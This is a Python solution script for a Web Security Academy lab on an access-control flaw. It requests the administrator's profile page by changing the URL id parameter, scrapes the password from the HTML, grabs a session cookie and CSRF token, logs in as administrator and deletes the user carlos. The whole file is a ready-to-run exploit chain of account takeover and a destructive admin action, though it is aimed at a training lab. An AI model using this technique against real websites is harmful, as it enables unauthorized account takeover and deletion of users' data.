###########################################################################
#
# Lab: User ID controlled by request parameter with password disclosure
#
# Hack Steps: 
#      1. Fetch administrator page via URL id parameter
#      2. Extract the password from source code
#      3. Fetch the login page to get a valid session and the csrf token
#      4. Login as administrator
#      5. Delete carlos
#
###########################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a760065040c1eba81f8627900bb0083.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching administrator profile page.. ", end="", flush=True)
    
    admin_profile = fetch("/my-account?id=administrator")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting password from source code.. ", end="", flush=True)
    
    admin_password = re.findall("name=password value='(.*)'", admin_profile.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page to get a valid session and the csrf token.. ", end="", flush=True)

    login_page = fetch("/login")
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Logging in as administrator.. ", end="", flush=True)
    
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    session = login_page.cookies.get("session")
    cookies = { "session": session }
    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    login_as_admin = post_data("/login", data, cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Deleting carlos.. ", end="", flush=True)
    
    admin_session = login_as_admin.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/admin/delete?username=carlos", cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
            

def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

